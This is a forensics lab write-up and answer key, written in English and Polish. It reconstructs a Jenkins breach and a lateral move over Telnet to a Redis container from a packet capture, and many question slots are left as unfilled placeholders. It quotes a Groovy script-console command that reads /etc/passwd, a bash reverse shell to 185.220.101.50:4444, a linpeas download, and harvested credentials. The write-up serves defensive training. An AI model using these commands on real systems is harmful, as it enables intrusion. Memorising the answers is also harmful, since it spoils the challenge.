# RediShell - Kinsing
The packet capture was killed mid-attack. Race against incomplete evidence to reconstruct how attackers breached Jenkins, pivoted through containers, and escaped to the host

## Scenario
Before the ransomware deployment, the attackers established initial access through a misconfigured CI/CD server running in a Docker container within Wowza's development network. Security monitoring detected unusual outbound connections from the container subnet to a suspicious external IP address. A packet capture was initiated automatically but was terminated when the attacker discovered and killed the monitoring process. Your task is to analyze this network traffic to understand how the attackers gained their initial foothold and moved laterally within the containerized environment.

## Tools
Analiza pliku .pcap
Najbardziej typowe narzędzie to będzie wireshark

## Q&A
### Initial Access & Reconnaissance
#### Q1
Security monitoring flagged suspicious HTTP traffic targeting the container subnet. Identifying the first system that received malicious requests is essential for establishing the initial point of compromise. What is the IP address of the first compromised system?
<details>
  <summary>Answer: Click me</summary>
  172.16.10.10
</details>

```
Statistics > Converastion > Ipv4
Pierwsza komunikacja z zewnątrz na która natafiamy w Wireshark trafia właśnie na ten adres Ip.
```

#### Q2
Identifying attacker IP is critical for threat intelligence and blocking future connections. What is the attacker's command and control (C2) IP address?
<details>
  <summary>Answer: Click me</summary>
  185.220.101.50
</details>

```
Analogicznie do pierwszego pytania ten adres pierwszy nawiązał komunikację, co więcej w dalszej jego czesci widać wyknywanie złosliwych zapytań. 
```

#### Q3
What web application and version was exploited for initial access?
<details>
  <summary>Answer: Click me</summary>
  Jenkins, 2.387.1
</details>

```
W nagłówku tej komunikacji widać że zapytania idą poprzez curl. I wodać że odpowiada serwer gdzie jednym z nagłówków jest X-Jenkins: 2.387.1
```

#### Q4
Before fully exploiting a vulnerability, attackers often perform a proof-of-concept test to confirm code execution capabilities. What file did the attacker initially read to test the vulnerability? (Provide full path)
<details>
  <summary>Answer: Click me</summary>
  /etc/passwd
</details>

```
Okazuje się że jenkins w tej wersji podatny jest między innymi na RCE przy dostepie do endpointa /script
Slędząc kolejne konwersacje pomiędzy w/w adresami natrafiamy na wywołanie komendy println 'cat /etc/passwd'.execute().text
```

#### Q5
Identifying this vulnerable endpoint helps understand the attack vector and informs remediation efforts. What is the URI path of the vulnerable endpoint exploited by the attacker?
<details>
  <summary>Answer: Click me</summary>
  /script
</details>

```
Analogicznie do poprzednich pytań w tych samych miejscach odczytujemy na jaki endpoint kierowane jest żadanie.
```

#### Q6
After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
<details>
  <summary>Answer: Click me</summary>
  4444
</details>

```
W kolejnej komunikacji widzimy wykonanie komendy: def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()
W niej widac zawarty port.
```

#### Q7
Once inside the compromised container, the attacker uploaded a well-known enumeration script to identify privilege escalation vectors. What privilege escalation enumeration script did the attacker download after gaining shell access?
<details>
  <summary>Answer: Click me</summary>
  linpeas
</details>

```
Po zestawieniu reverse shell , podążając za komunikacją w kolejnych tcp.stream widzimy komunikację po TCP w której odbywa między innymi pobranie: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

#### Q8
What file did the attacker read to obtain lateral movement credentials? (Provide full path)
<details>
  <summary>Answer: Click me</summary>
  /var/jenkins_home/credentials.txt
</details>

```
Użyte narzędzie LinPEAS posiada wiele ciekawych modułów. Między innymi szuka "ciekawych" plików, sekretów, analizuje usługi, userów i wiele wiele innych. W streame TCP widac wynik prac skryptu, widać tez że atakujący otwiera plik z lokalizacji która jest odpowiedzią.
```

#### Q9
What username and password combination did the attacker use for authentication to the second system? (Format: username:password)
<details>
  <summary>Answer: Click me</summary>
  redis_user:R3d1s_Us3r_P@ss!
</details>

```
Nawiązując do wcześniejszej odpowiedzi, w zawartości pliku są dane telnet dla redis. Widać nawiązanie sesji telnet tymi danymi.
```

#### Q10
The attacker used a legacy protocol to connect to the second target system. What unencrypted protocol did the attacker use for lateral movement?
<details>
  <summary>Answer: Click me</summary>
  telnet
</details>

```
To konsekwencja tego co odkryliśmy w dwoch poprzednich pytaniach.
```

#### Q11
After successfully authenticating with harvested credentials, the attacker gained access to a second container in the environment. Identifying this system helps map the scope of the compromise. What is the IP address of the second compromised system?
<details>
  <summary>Answer: Click me</summary>
  172.16.10.20
</details>

```
Odpowiedz na pytanie nadal jest powiązana z wczesniejszymi odpowiedzami. Adres kolejnego skompromitowanego systemu to adres na który akatujący łaczył się protokołem telnet.
```

#### Q12
The Telnet login banner and subsequent enumeration revealed the hostname and the version of the data storage service running on the second compromised container. This information is crucial for identifying potential vulnerabilities. What is the hostname of the second compromised container and the version of the vulnerable data storage service? (Format: hostname, version)
<details>
  <summary>Answer: Click me</summary>
  redis-db.corp.local, 5.0.7
</details>

```
Na początku sesji telnet iwdać wywołanie komendy hostname co daje nam pierwsza częśc odpowiedzi. Druga częśc nawiązuje do "vulnerable data storage service" co nie do końca jest jasne. Ale przyjmując że jesteśmy na serwerze redis , to pewnie o niego chodzi. W trakcie tej sesji znowu użyto narzędzia "LinPEAS" i jeden z modułów skanuje "Analyzing Redis Files" co w efekcie daje nam w output informacje o wersji.
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```

#### Qx
xxx
<details>
  <summary>Answer: Click me</summary>
  xxx
</details>

```
xxx
```